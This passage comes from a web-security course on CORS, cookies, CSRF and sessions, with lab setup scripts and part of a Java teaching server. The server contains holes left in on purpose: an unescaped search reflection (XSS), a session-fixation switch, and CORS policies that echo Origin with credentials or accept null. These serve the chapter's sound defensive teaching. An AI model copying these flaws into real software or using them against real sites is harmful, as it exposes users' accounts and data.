| `echo-vary`    | Same, plus `Vary: Origin`                                                                             | Safe for public data. Still no cookies                                                 |
| `creds`        | `Allow-Origin` = the request's `Origin` **and** `Allow-Credentials: true`                             | **Every origin reads alice's data**: `evil.localhost` got `read(alice)`                |
| `starcreds`    | `*` and `Allow-Credentials: true`                                                                     | The browser refuses it: invalid combination                                            |
| `allowlist`    | `Allow-Origin` and `Allow-Credentials` only when `Origin` is exactly `http://app.shop.localhost:PORT` | Correct: `app` reads alice, `evil` and `evil-shop` are `blocked`                       |
| `containsbug`  | Same, when `Origin` merely *contains* `shop.localhost`                                                | `evil-shop.localhost` got `read(alice)`: a substring match                             |
| `null`         | `Allow-Origin: null` and `Allow-Credentials: true`                                                    | A sandboxed `<iframe>`, whose origin is `null`, read alice                             |

Four lessons, each tied to a row:

- **Reflecting the request's `Origin` with credentials is the same as having no policy.** It is the single most common CORS mistake.  
  The server must compare against a fixed list and send nothing for any other origin (`allowlist`), and match the *whole* origin: scheme, host and port, not a substring (`containsbug`), not a suffix, not a regular expression with an unescaped dot.

- **Never allow `null`.** Browsers send `Origin: null` for sandboxed frames, `data:` URLs and some redirects, and an attacker can make a page of that kind at will.

- **CORS does not protect the server.** In the `none` row the `POST` with `text/plain` and cookies executed on the server and only the *reading* was blocked.  
  If the endpoint accepts a form-shaped or `text/plain` body, the write has happened before the browser applies the policy.  
  Defend writes with the CSRF defences of 10.04.

- **Send `Vary: Origin`** whenever the response depends on `Origin`, or a shared cache serves one origin's `Allow-Origin` to the next.

The browser prints a specific message for each refusal (Lab 07 part B): `No 'Access-Control-Allow-Origin' header is present on the requested resource` for `none`; the wildcard message for `starcreds`;  
and `Response to preflight request doesn't pass access control check` when the preflight, not the real request, was refused.  

The `PUT` on the allowlist from `evil.localhost` never left the browser, which is the one place a preflight protects the server: the non-simple write is never sent.

### What CORS does not cover

- **WebSocket.** The handshake carries `Origin` and the browser enforces nothing: the server must check it (H08).

- **Anything that is not a script read.** `<img>`, `<script src>`, form posts and navigations ignore CORS.  
  A cross-origin `<script src>` that returns JSON-padded data (an old technique called JSONP) executes in the including page.

- **Non-browser clients.** `curl` and any server-side HTTP client ignore the policy. Lab 07's curl part reads the `cors=none` body in full.

- **Authorisation.** It says which pages may read. It does not say which users may call.

### Interview angle

- *"What triggers a preflight and what does it contain?"*  
  A non-simple request: a method beyond `GET`, `HEAD`, `POST`, a non-safelisted header, or a content type beyond the three form types.  
  It is an `OPTIONS` with `Origin`, `Access-Control-Request-Method` and `Access-Control-Request-Headers`, and no cookies.

- *"Why can't `Access-Control-Allow-Origin: *` be used with credentials?"*  
  The browser refuses the combination; with credentials the server must name the origin, so that a site cannot silently extend a user's authority to every page.

- *"Is CORS a security feature for the API?"*  
  It protects users' data from other sites' scripts, in browsers. It protects the API from nothing.  
  The API still needs authentication, authorisation, and CSRF defences.

- *"A teammate echoes the `Origin` header into `Allow-Origin` with credentials. Is that a vulnerability?"*  
  Yes, a severe one: any website can then read the logged-in user's data. Replace it with an exact allowlist.

---

## 10.07 The story: one login across a shop, its API and its blog

A company runs `shop.example.com` (pages and login), `api.shop.example.com` (a JSON API the checkout widget calls), and `blog.shop.example.com` (a company blog whose readers may comment).  
A partner site, `partner.example.org`, embeds the shop's "track my order" widget in an iframe.  
An attacker has a page at `evil.example.net`.  
Each chapter below is a decision a team makes while building this, in the order it tends to be made, with the mistake that is common and the lab that shows what it costs.  
The lab shop answers to `shop.localhost`, `api.shop.localhost`, `blog.shop.localhost` and `evil.localhost` in place of these names.  
Results that come from a lab are marked with it; the rest of the story is a plausible deployment, not a measurement.

### The journey at a glance

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as shop.example.com
    participant A as api.shop.example.com
    participant E as evil.example.net
    B->>S: GET /, no cookie
    S->>B: 200, Set-Cookie __Host-sid anonymous, Secure, HttpOnly, SameSite Lax
    B->>S: POST /login, Cookie __Host-sid
    S->>B: 200, Set-Cookie __Host-sid new value, session rotated
    B->>S: POST /api-token, Origin shop, Sec-Fetch-Site same-origin
    S->>B: 200, signed token valid for 5 minutes
    B->>A: OPTIONS preflight, Origin shop, Authorization requested
    A->>B: 204, Allow-Origin shop only, Vary Origin, Max-Age 600
    B->>A: GET /orders, Authorization bearer token
    A->>B: 200, orders, Allow-Origin shop
    B->>E: user opens the attacker's page
    E->>S: forged POST /transfer from the victim's browser
    S->>B: 403, Sec-Fetch-Site cross-site
```

### Chapter 01: the first visit and the login

The shop creates an anonymous session on the first visit so it can keep a cart, and sets a cookie.  
The common first draft is `Set-Cookie: sid=...` with nothing else.  

The finished version is `Set-Cookie: __Host-sid=<22 characters>; Path=/; Secure; HttpOnly; SameSite=Lax`: 128 random bits from the operating system's generator (Lab 04),  
host-only and locked to the exact host by the prefix, hidden from scripts, sent only over HTTPS, withheld from cross-site subresource requests.  

sAt login the shop discards the anonymous session and issues a new id (Lab 04 part B: the same attack ends `HTTP 401` instead of `HTTP 200 alice`).  
The server enforces an idle timeout of 30 minutes and an absolute one of 12 hours; the cookie says nothing about either.

### Chapter 02: the blog

The company blog lets readers comment, and a comment can contain markup.  
The team's first idea for single sign-on is `Domain=shop.example.com` on the session cookie, so that every subdomain sees the login.  
It works, and it makes the blog a trusted part of the shop: a script in a comment on the blog can set cookies for the whole shop, and a page there can send same-site requests that `SameSite` waves through.  
Lab 05 part C: the planted cookie locks the victim out or, on a server that keeps the id at login, logs the attacker in as them;  
Lab 05 part A2: from the blog's origin the transfer is `STOLEN` under every `SameSite` setting.  

The fix has two parts.  
Keep the session cookie host-only and `__Host-` prefixed so nothing on a sibling can plant or overwrite it, and move reader-submitted content to a separate registrable domain,  
which also removes the blog from the same-site relation.

### Chapter 03: the API

The checkout widget calls `api.shop.example.com`.  
The host-only cookie does not reach it (Lab 02 part A step 07), so the first draft sets `Domain=shop.example.com` again (chapter 02's mistake)  
and writes a CORS filter that copies the request's `Origin` into `Allow-Origin` and adds `Allow-Credentials: true`, because the widget "got a CORS error".  

That is the `creds` policy of Lab 07: every website on the internet can read the logged-in user's orders.  
A second draft matches origins with `contains("example.com")` and is beaten by `evil-example.com` (`containsbug`).

The finished design does not send the cookie to the API at all.  
The widget, on a shop page, asks `POST /api-token` on the shop itself, which is same-origin, checks `Sec-Fetch-Site`, and returns a signed token valid for 5 minutes (10.03);  
the widget keeps it in memory and sends it as `Authorization: Bearer ...` to the API.  

That header makes the request non-simple, so the browser preflights it, and the API's CORS policy is the exact allowlist `https://shop.example.com` with `Vary: Origin`,  
a preflight cache of 600 seconds, and no credentials (Lab 07: one preflight for three `PUT`s).  

With no ambient authority on the API there is nothing for CSRF to ride on, and the token's short life bounds a theft.  
Revocation happens at the shop, which refuses to issue the next token.

### Chapter 04: the attacker's page

The user, still logged in, opens `evil.example.net`, whose page submits a hidden form to `https://shop.example.com/transfer`.  
In the Lab 05 matrix this is the first table. `SameSite=Lax` withholds the cookie from the cross-site `POST` (`no cookie`,  
so the transfer fails), and the shop's `Sec-Fetch-Site` check would reject the request even if a browser attached it (`rejected`).  

The "delete account" link was originally a `GET` and would have been `STOLEN` under `Lax` (`transfer-get`): it became a `POST`.  
The endpoint also insists on `application/json`, so a forged form cannot hit it, and the attacker's script cannot get its preflight approved (`preflight fails`).

### Chapter 05: the partner's widget

The "track my order" iframe on `partner.example.org` needs to remember the last order number the visitor typed.  
In a browser that blocks third-party cookies the shop's usual cookie is not stored or sent in the frame (Lab 06: `[]`).  
The widget sets a separate cookie `Set-Cookie: __Host-widget=...; Secure; SameSite=None; Path=/; Partitioned`, which each embedding site gets a private copy of (Lab 06: `[wp]` on the site that created it, nothing elsewhere).  
Its login uses a top-level redirect instead of a hidden frame.

### Chapter 06: the last day

At logout the shop deletes the session on the server and sends `Set-Cookie: __Host-sid=; Path=/; Secure; HttpOnly; Max-Age=0`: same name, path and host-only scope, so the browser removes it.  
A token the API already holds stays valid for its remaining minutes, which the team accepted when it chose five minutes.

### Where it would have gone wrong

| Chapter | If this were mishandled                                | The failure                                                                                              | Evidence              |
| ------- | ------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- | --------------------- |
| 01      | Session id kept at login                               | An attacker with a pre-login id reads the account                                                        | Lab 04 part B         |
| 01      | Id from a counter or the clock                         | The next id is guessable: hijacking by guessing                                                          | Exercise 03           |
| 01      | `HttpOnly` missing                                     | One XSS exports the session to the attacker's server                                                     | Lab 05 part B         |
| 02      | `Domain=shop.example.com` on the session cookie        | Any subdomain, the blog included, can plant or overwrite the session cookie                              | Lab 05 part C         |
| 02      | Reader content on a sibling subdomain                  | `SameSite` no longer separates the attacker from the shop: forged transfers succeed                      | Lab 05 part A2        |
| 03      | CORS policy reflects `Origin` with credentials         | Any site reads the user's data                                                                           | Lab 07 `creds`        |
| 03      | CORS match by `contains`                               | `evil-example.com` passes                                                                                | Lab 07 `containsbug`  |
| 03      | `Access-Control-Allow-Origin: null` accepted           | A sandboxed iframe reads the user's data                                                                 | Lab 07 `null`         |
| 03      | A long-lived signed token with no way to revoke it     | A stolen token works for hours or days after the user logs out                                           | Lab 04 section 05     |
| 03      | Verifier trusts the token's `alg`                      | A forged token with `alg: none` is accepted as admin                                                     | Lab 04 section 04     |
| 04      | State change on `GET`                                  | `Lax` lets a clicked link carry the cookie: forged                                                       | Lab 05 `transfer-get` |
| 04      | No `Origin`/`Sec-Fetch-Site` check and no token        | Same-site attackers and old browsers get through `SameSite`                                              | Lab 05 part A2        |
| 05      | A cookie `SameSite=None` and unpartitioned in an embed | Silently stops working when the browser blocks third-party cookies; tracks across sites when it does not | Lab 06                |
| 06      | Logout only clears the cookie in the browser           | The server session lives on; a copied id still works                                                     | Lab 04 section 05     |

---

## 10.08 Labs: what each one shows and how to run it

| Lab | Topic                                                                                        | Covers       | Needs                                          |
| --- | -------------------------------------------------------------------------------------------- | ------------ | ---------------------------------------------- |
| 00  | Setup: the shop in Java and Rust, the helper scripts, the folder layout                      | All          | Linux or macOS, JDK 21, Rust, Node 20+, `curl` |
| 01  | Origins and the same-origin policy as Chromium sees them                                     | 10.01        | Node, Chromium                                 |
| 02  | Cookies on the wire: `curl`, a teaching cookie jar, Chromium, `curl` again, limits, prefixes | 10.02        | `curl`, Java, Rust, Node, Chromium             |
| 03  | The `SameSite` matrix: eight contexts, four cookies, against the jar's prediction            | 10.02        | Node, Chromium, Java                           |
| 04  | Sessions against tokens, and session fixation                                                | 10.03, 10.04 | Java, Rust, `curl`                             |
| 05  | CSRF, XSS and cookie tossing, each with its defences                                         | 10.04        | Node, Chromium                                 |
| 06  | Third-party cookies, with and without blocking, and `Partitioned`                            | 10.05        | Node, Chromium                                 |
| 07  | CORS: nine server policies, four request kinds, the browser's messages                       | 10.06        | `curl`, Node, Chromium                         |

The track plan lists no lab for H10.  
These seven make each sub-topic visible.  
Every browser lab drives a real Chromium and reads what the *server* received from the shop's request log,  
because the page's own view (a script that gets `blocked`) hides whether the request was sent.  

Every lab runs against the Java shop on port 9400; the Rust shop on 9401 produces the same transcripts, and Lab 00's last part and `run_all_labs.sh` prove it.

### Setup, once

As in H06 to H09, a disposable Linux container is the easiest place:

```text
docker run --rm -it -v "$PWD":/h10 -w /h10 ubuntu:24.04
apt update && apt install -y openjdk-21-jdk-headless curl iproute2 ca-certificates
# Rust 1.85+ via rustup, as in H01. Node 20 or newer from nodejs.org or nvm (Ubuntu 24.04's packaged Node 18 is too old)
npm install playwright@1.63.0
npx playwright install --with-deps chromium     # downloads Chromium 153 for Playwright 1.63
(cd rust && cargo build --release)
./start_all.sh
```

Chromium resolves every `*.localhost` name to the loopback address by itself, and `curl` 7.78 or later does too, so no `/etc/hosts` entries are needed: `shop.localhost`, `api.shop.localhost`, `blog.shop.localhost`, `evil.localhost` and all the others reach the shop on 127.0.0.1.  

Chromium also treats `localhost` names as *potentially trustworthy*, which is why a `Secure` cookie can be set over plain `http://` in these labs (the behaviour that Lab 02 part C compares with `curl`).  
If your shell sets `NO_PROXY` to include loopback, scripts that call the shop with `curl` pass `--noproxy ''` anyway.  
The `JAVA_TOOL_OPTIONS` variable, if your environment sets it, prints a banner on every JVM start; the scripts unset it.  
The lab uses ports 9400 and 9401 and, in Exercise 05, 9500.

Folder layout:

```text
h10/
  start_all.sh  stop_all.sh        <- the two shops in the background, logs in logs/, pids in run/
  run_all_labs.sh                  <- every lab in order against fresh servers, transcripts in out/ (about 5 minutes)
  run_exercises.sh                 <- the programs behind the solutions of 10.10, output in out/ex*.txt
  play.sh  wire.sh                 <- run a commands file with prompts; print only the header lines of one curl call
  lab02_wire.cmds  lab07_curl.cmds <- the commands of Lab 02 part A and Lab 07 part A
  lab04_fixation.sh                <- Lab 04 part B
  parity.sh  parity_run.sh         <- the same 40 requests to the Java and the Rust shop, compared
  package.json  node_modules/      <- created by npm install playwright
  drivers/
    lib.js  origins.js  limits.js  prefixes.js  samesite.js  crosscheck.js
    attacks.js  thirdparty.js  cors.js
  scenarios/
    s01_scope.txt  s02_parse.txt  s03_samesite.txt  s04_prefixes.txt   <- the teaching jar, alone
    x01_scope.txt  x02_quirks.txt  x03_secure.txt                       <- the jar, curl and Chromium compared
  exercises/
    e01.txt  e02a.txt  e02b.txt  e03.txt  e04.txt  Classify.java  WeakLogin.java  CorsReview.java  Tax.java  wildcard_probe.js
  java/
    CookieShop.java  CookieJar.java  SessionVsToken.java
  rust/
    Cargo.toml
    src/bin/cookie_shop.rs  cookie_jar.rs  session_vs_token.rs
  out/  logs/  run/                <- created by the scripts
```

The servers, started by `./start_all.sh` from `h10`:

| Server               | Port | Role                                                                  |
| -------------------- | ---- | --------------------------------------------------------------------- |
| `CookieShop.java`    | 9400 | The Java shop: every route below                                      |
| `cookie_shop` (Rust) | 9401 | The Rust twin, with the same routes, headers, decisions and log lines |

The shop answers on every host name, so a lab chooses the host it wants by the URL. Its routes:

| Route                                                      | What it is for                                                                             | Section      |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------ | ------------ |
| `GET /set?c=<line>&c=<line>`, or any path ending in `/set` | Sends exactly the `Set-Cookie` fields it is given, one field per `c` (the cookie bench)    | 10.02        |
| `GET /echo`, or any path ending in `/echo`                 | Prints the host and the `Cookie`, `Origin`, `Referer` and `Sec-Fetch-*` fields it received | 10.01, 10.02 |
| `GET /`                                                    | Creates an anonymous session and sets the session cookie                                   | 10.03        |
| `POST /login`, `POST /logout`                              | Log in as `alice`/`wonderland`, `bob`/`builder`, `mallory`/`m4llory`. Log out              | 10.03        |
| `GET /account`, `GET /state`                               | An account page (user, balance, hidden CSRF field), or all balances                        | 10.03, 10.04 |
| `POST /transfer`                                           | Moves money on a valid session cookie alone                                                | 10.04        |
| `GET /transfer-get`                                        | The same on `GET`                                                                          | 10.04        |
| `POST /transfer-token`                                     | Requires the CSRF token from the account page                                              | 10.04        |
| `POST /transfer-origin`                                    | Requires `Origin` to equal the shop's own origin                                           | 10.04        |
| `POST /transfer-fetchmeta`                                 | Requires `Sec-Fetch-Site: same-origin`                                                     | 10.04        |
| `POST /transfer-json`                                      | Requires `Content-Type: application/json`                                                  | 10.04        |
| `GET /search?q=`                                           | Reflects `q` into the page unescaped: the XSS                                              | 10.04        |
| `GET`, `POST`, `PUT`, `OPTIONS /api/data`                  | The CORS endpoint: the policy is chosen by `?cors=`, writes increment a counter            | 10.06        |
| `GET /blank`, `GET /collect?...`                           | An empty page; a sink that logs what an attacker's server would receive                    | all          |
| `GET /__log[?clear=1]`, `POST /__reset`                    | The request log; a reset of all state (balances alice 1000, bob 1000, mallory 0)           | all          |

The knobs, in the query string:

| Knob                                                                               | Where         | Effect                                                                           |
| ---------------------------------------------------------------------------------- | ------------- | -------------------------------------------------------------------------------- |
| `samesite=none\|lax\|strict\|unset`                                                | `/login`, `/` | The `SameSite` of the session cookie (default `lax`; `unset` sends no attribute) |
| `httponly=off`                                                                     | `/login`, `/` | Omit `HttpOnly`                                                                  |
| `prefix=host`                                                                      | `/login`, `/` | Name the cookie `__Host-sid` instead of `sid`                                    |
| `domain=on`                                                                        | `/login`, `/` | Add `Domain=<the request's host>`                                                |
| `secure=on\|off`                                                                   | `/login`, `/` | Add or drop `Secure`                                                             |
| `fix=on`                                                                           | `/login`      | The fixation bug: keep the session id the visitor arrived with                   |
| `cors=none\|star\|echo\|echo-vary\|creds\|starcreds\|allowlist\|containsbug\|null` | `/api/data`   | The nine CORS policies of 10.06                                                  |
| `expose=on`                                                                        | `/api/data`   | Send `Access-Control-Expose-Headers: X-Request-Id`                               |
| `pf=500\|nohdr`                                                                    | `/api/data`   | Break the preflight: answer `500`, or leave out `Access-Control-Allow-Headers`   |

The request log is the lab's instrument.  
Each line is `METHOD host/path  cookies=[names]  user=..  origin=..  sf-site=..  sf-mode=..  sf-dest=..  -> status note`, with the cookie *names* only and `sf-` for the `Sec-Fetch-` fields.  
`GET /__log` prints it.

`start_all.sh` and `stop_all.sh`:

```sh
#!/bin/bash
# Starts the two shop origins in the background: Java on 9400, Rust on 9401. Logs under logs/, pids under run/.
# Run from the h10/ folder after:  (cd rust && cargo build --release)
mkdir -p logs run
(cd java && exec env -u JAVA_TOOL_OPTIONS java CookieShop.java 9400) > logs/shop_java.log 2>&1 &
echo $! > run/shop_java.pid
rust/target/release/cookie_shop 9401 > logs/shop_rust.log 2>&1 &
echo $! > run/shop_rust.pid
for p in 9400 9401; do
    until (exec 3<>/dev/tcp/127.0.0.1/$p) 2>/dev/null; do sleep 0.3; done
    echo "port $p up"
done
```

```sh
#!/bin/bash
# Stops what start_all.sh started, and waits until both ports are free.
for f in run/*.pid; do [ -f "$f" ] && kill "$(cat "$f")" 2>/dev/null; done
rm -f run/*.pid
for p in 9400 9401; do
    while ss -tln "sport = :$p" | grep -q LISTEN; do sleep 0.2; done
done
```

Two helpers used by the curl labs. `play.sh` runs a file of commands and prints each one after a `$` prompt, so a transcript shows what was typed.  
`wire.sh` prints the request and response header lines of one `curl` call, leaving out the fields that only add noise:

```sh
#!/bin/bash
# Runs a commands file: every non-comment line is echoed with a "$ " prompt, executed, and followed by a blank line.
# Usage: ./play.sh <commands-file>
while IFS= read -r line; do
    case "$line" in
        '' | '#'*) echo "$line" ;;
        *) echo "\$ $line"; eval "$line" 2>&1; echo ;;
    esac
done < "$1"
```

```sh
#!/bin/sh
# Prints the request and response header lines of one curl call: request lines with "> ", response lines with "< ".
# Date, Server, User-Agent, Accept and the body-describing fields are left out; the body is discarded.
# Usage: ./wire.sh <url> [curl options]
curl -sv --noproxy '' -o /dev/null "$@" 2>&1 | grep -E '^[<>] ' | tr -d '\r' \
  | grep -v -E '^< (Date|Server|Cache-Control|Content-Type|Content-Length):|^> (User-Agent|Accept):'
```

The Java shop, used by every lab.  
It is one file with the standard library only: a raw-socket HTTP/1.1 server (H05, H07) with the routes above.  
Read `sessionId` (the first `__Host-sid`, else the first `sid`: the order dependence that cookie tossing exploits),  
`login` (the `fix=on` switch), the five `transfer-*` handlers, and `addCors` (the nine policies):

```java
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.time.ZoneOffset;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// The origin server for every H10 lab: a toy shop with sessions, a transfer endpoint with five levels of CSRF
// defence, a CORS endpoint with eight policies, and a "cookie bench" that emits whatever Set-Cookie lines you ask for.
// One file, standard library only; the Rust twin is cookie_shop.rs. It answers on every host name, so the labs can
// call it shop.localhost, api.shop.localhost, blog.shop.localhost, evil.localhost and so on.
//
//   GET  /set?c=<Set-Cookie line>&c=...   sends exactly these Set-Cookie fields            (cookie bench)
//   GET  /echo                            prints the cookie and context fields it received (cookie bench)
//        (any path ending in /set or /echo does the same, e.g. /a/b/set)
//   GET  /                                creates an anonymous session, sets the session cookie
//   POST /login   POST /logout   GET /account   GET /search?q=   GET /state
//   POST /transfer           cookie only
//   GET  /transfer-get       state change on GET
//   POST /transfer-token     CSRF token in the form
//   POST /transfer-origin    Origin header must be the shop's
//   POST /transfer-fetchmeta Sec-Fetch-Site must be same-origin
//   POST /transfer-json      Content-Type must be application/json (forces a preflight from other origins)
//   GET|POST|PUT|OPTIONS /api/data        CORS endpoint, policy chosen by ?cors=
//   GET  /blank   GET /collect?...        an empty page; a sink that logs what an attacker would receive
//   GET  /__log[?clear=1]   POST /__reset  the request log, and a reset of all state
// Lab knobs on /login and /: samesite=none|lax|strict|unset  httponly=off  prefix=host  domain=on  secure=on|off
//   fix=on (login keeps the session id: the fixation bug).
// Usage: java CookieShop.java <port>
public class CookieShop {
    static final DateTimeFormatter HTTP_DATE = DateTimeFormatter.ofPattern("EEE, dd MMM yyyy HH:mm:ss 'GMT'", Locale.US);
    static final SecureRandom RANDOM = new SecureRandom();
    static final Map<String, String> PASSWORDS = Map.of("alice", "wonderland", "bob", "builder", "mallory", "m4llory");
    static final Map<String, Integer> BALANCES = new ConcurrentHashMap<>();
    static final Map<String, Session> SESSIONS = new ConcurrentHashMap<>();
    static final List<String> LOG = Collections.synchronizedList(new ArrayList<>());
    static int port;
    static int counter = 0;
    static int requestIds = 0;

    static final class Session {
        String user;                       // null while anonymous
        final String csrf = token(12);
    }

    // A response. Header lines are kept in order and may repeat: Set-Cookie must never be combined (H07).
    static final class Resp {
        int status = 200;
        String reason = "OK";
        final List<String[]> h = new ArrayList<>();
        byte[] body = new byte[0];
        String note = "";
        Resp status(int s, String r) { status = s; reason = r; return this; }
        Resp header(String k, String v) { h.add(new String[]{k, v}); return this; }
    }

    record Req(String method, String host, String path, Map<String, List<String>> query, List<String> head,
               Map<String, List<String>> form, String body) { }

    public static void main(String[] args) throws Exception {
        port = Integer.parseInt(args[0]);
        reset();
        try (var listener = new ServerSocket()) {
            listener.setReuseAddress(true);
            listener.bind(new InetSocketAddress("127.0.0.1", port), 1024);
            System.out.printf("cookie shop (Java) on 127.0.0.1:%d%n", port);
            while (true) {
                Socket s = listener.accept();
                Thread.ofVirtual().start(() -> serve(s));
            }
        }
    }

    static void reset() {
        BALANCES.clear();
        BALANCES.putAll(Map.of("alice", 1000, "bob", 1000, "mallory", 0));
        SESSIONS.clear();
        LOG.clear();
        counter = 0;
        requestIds = 0;
    }

    static String token(int bytes) {
        byte[] b = new byte[bytes];
        RANDOM.nextBytes(b);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(b);
    }

    // ---------------------------------------------------------------- connection handling

    static void serve(Socket s) {
        try (s) {
            s.setTcpNoDelay(true);
            s.setSoTimeout(30_000);
            InputStream in = new BufferedInputStream(s.getInputStream());
            OutputStream out = s.getOutputStream();
            while (true) {
                String requestLine = readLine(in);
                if (requestLine == null) return;
                List<String> head = new ArrayList<>(List.of(requestLine));
                for (String line; !(line = readLine(in)).isEmpty(); ) head.add(line);
                String cl = header(head, "content-length");
                String body = cl == null ? "" : new String(in.readNBytes(Integer.parseInt(cl.trim())), StandardCharsets.UTF_8);
                String[] rl = requestLine.split(" ");
                String method = rl[0];
                String target = rl[1];
                int qm = target.indexOf('?');
                String path = qm < 0 ? target : target.substring(0, qm);
                String hostHeader = header(head, "host");
                String host = hostHeader == null ? "-" : hostHeader.toLowerCase(Locale.ROOT).replaceFirst(":\\d+$", "");
                Map<String, List<String>> query = parseForm(qm < 0 ? "" : target.substring(qm + 1));
                String ctype = header(head, "content-type");
                Map<String, List<String>> form = ctype != null && ctype.startsWith("application/x-www-form-urlencoded")
                        ? parseForm(body) : Map.of();
                Req req = new Req(method, host, path, query, head, form, body);
                Resp r = route(req);
                boolean keepAlive = rl[2].equals("HTTP/1.1") && !"close".equalsIgnoreCase(header(head, "connection"));
                write(out, r, method.equals("HEAD"), keepAlive);
                if (!path.equals("/favicon.ico") && !path.startsWith("/__")) logRequest(req, r);
                if (!keepAlive) return;
            }
        } catch (EOFException e) {
            // client closed mid-message
        } catch (Exception e) {
            System.out.println("error: " + e);
        }
    }

    // One line per request: who asked (cookie names only, never values), from where, and what happened.
    static void logRequest(Req r, Resp resp) {
        var sb = new StringBuilder(String.format("%-7s %s%s  cookies=[%s]", r.method(), r.host(), r.path(),
                String.join(",", cookies(r).stream().map(c -> c[0]).toList())));
        Session s = session(r);
        if (s != null && s.user != null) sb.append("  user=").append(s.user);
        for (String n : List.of("origin", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest")) {
            String v = header(r.head(), n);
            if (v != null) sb.append("  ").append(n.replace("sec-fetch-", "sf-")).append('=').append(v);
        }
        sb.append("  -> ").append(resp.status).append(resp.note);
        LOG.add(sb.toString());
        System.out.println(sb);
    }

    // ---------------------------------------------------------------- routing

    static Resp route(Req r) {
        String p = r.path();
        if (p.endsWith("/set")) return set(r);                       // any path ending in /set or /echo works, so that the
        if (p.endsWith("/echo")) return echo(r);                     // cookie Path and the default path can be tested
        return switch (p) {
            case "/" -> home(r);
            case "/login" -> login(r);
            case "/logout" -> logout(r);
            case "/account" -> account(r);
            case "/search" -> search(r);
            case "/state" -> text(BALANCES.entrySet().stream().sorted(Map.Entry.comparingByKey())
                    .map(e -> e.getKey() + "=" + e.getValue()).reduce((a, b) -> a + " " + b).orElse("") + "\n");
            case "/transfer", "/transfer-get", "/transfer-token", "/transfer-origin", "/transfer-fetchmeta", "/transfer-json" -> transfer(r);
            case "/api/data" -> apiData(r);
            case "/blank" -> html("<html><head><title>blank</title></head><body>blank</body></html>\n");
            case "/collect" -> collect(r);
            case "/__log" -> {
                String all = String.join("\n", LOG) + (LOG.isEmpty() ? "" : "\n");
                if ("1".equals(q(r, "clear", ""))) LOG.clear();
                yield text(all);
            }
            case "/__reset" -> { reset(); yield text("reset\n"); }
            default -> text("no such route\n").status(404, "Not Found");
        };
    }

    // The cookie bench: whatever is asked for goes out as separate Set-Cookie fields, byte for byte.
    static Resp set(Req r) {
        List<String> lines = r.query().getOrDefault("c", List.of());
        Resp resp = text("set " + lines.size() + " cookie(s)\n");
        for (String l : lines) resp.header("Set-Cookie", l);
        resp.note = "  set " + lines.size();
        return resp;
    }

    static Resp echo(Req r) {
        var sb = new StringBuilder();
        for (String n : List.of("host", "cookie", "origin", "referer", "sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest", "sec-fetch-user")) {
            String v = header(r.head(), n);
            sb.append(n).append(": ").append(v == null ? "-" : v).append('\n');
        }
        return text(sb.toString());
    }

    // ---------------------------------------------------------------- sessions

    static List<String[]> cookies(Req r) {
        List<String[]> out = new ArrayList<>();
        for (String line : r.head().subList(1, r.head().size())) {
            int c = line.indexOf(':');
            if (c > 0 && line.substring(0, c).trim().equalsIgnoreCase("cookie")) {
                for (String pair : line.substring(c + 1).split(";")) {
                    String t = pair.trim();
                    if (t.isEmpty()) continue;
                    int eq = t.indexOf('=');
                    out.add(eq < 0 ? new String[]{"", t} : new String[]{t.substring(0, eq), t.substring(eq + 1)});
                }
            }
        }
        return out;
    }

    // The session cookie: the first one named __Host-sid, else the first one named sid. "First" is the browser's order.
    static String sessionId(Req r) {
        for (String name : List.of("__Host-sid", "sid")) {
            for (String[] c : cookies(r)) if (c[0].equals(name)) return c[1];
        }
        return null;
    }

    static Session session(Req r) {
        String id = sessionId(r);
        return id == null ? null : SESSIONS.get(id);
    }

    // The Set-Cookie line for a session id, shaped by the lab knobs.
    static String sessionCookie(Req r, String value, boolean expire) {
        boolean hostPrefix = q(r, "prefix", "none").equals("host");
        String samesite = q(r, "samesite", "lax");
        var sb = new StringBuilder((hostPrefix ? "__Host-sid" : "sid") + "=" + (expire ? "" : value) + "; Path=/");
        if (q(r, "domain", "off").equals("on")) sb.append("; Domain=").append(r.host());
        if (!q(r, "httponly", "on").equals("off")) sb.append("; HttpOnly");
        switch (samesite) {
            case "lax" -> sb.append("; SameSite=Lax");
            case "strict" -> sb.append("; SameSite=Strict");
            case "none" -> sb.append("; SameSite=None");
            default -> { }
        }
        String secure = q(r, "secure", "auto");
        if (secure.equals("on") || (secure.equals("auto") && (hostPrefix || samesite.equals("none")))) sb.append("; Secure");
        if (expire) sb.append("; Max-Age=0");
        return sb.toString();
    }

    static Resp home(Req r) {
        Session s = session(r);
        Resp resp;
        if (s == null) {
            String id = token(16);
            SESSIONS.put(id, new Session());
            resp = text("hello, anonymous\n").header("Set-Cookie", sessionCookie(r, id, false));
            resp.note = "  new anonymous session";
        } else {
            resp = text("hello, " + (s.user == null ? "anonymous" : s.user) + "\n");
        }
        return resp;
    }

    static Resp login(Req r) {
        if (!r.method().equals("POST")) return text("POST only\n").status(405, "Method Not Allowed").header("Allow", "POST");
        String user = f(r, "user");
        String pw = PASSWORDS.get(user);
        if (pw == null || !pw.equals(f(r, "password"))) {
            Resp resp = text("bad credentials\n").status(401, "Unauthorized");
            resp.note = "  login failed for " + user;
            return resp;
        }
        Session old = session(r);
        String id;
        Session s;
        if (q(r, "fix", "off").equals("on") && old != null) {          // the bug: the id the visitor arrived with is kept
            id = sessionId(r);
            s = old;
        } else {                                                        // the fix: a new id at the moment of login
            if (old != null) SESSIONS.remove(sessionId(r));
            id = token(16);
            s = new Session();
            SESSIONS.put(id, s);
        }
        s.user = user;
        Resp resp = text("logged in as " + user + "\n").header("Set-Cookie", sessionCookie(r, id, false));
        resp.note = "  login ok, " + (id.equals(sessionId(r)) ? "session id kept" : "new session id");
        return resp;
    }

    static Resp logout(Req r) {
        String id = sessionId(r);
        if (id != null) SESSIONS.remove(id);
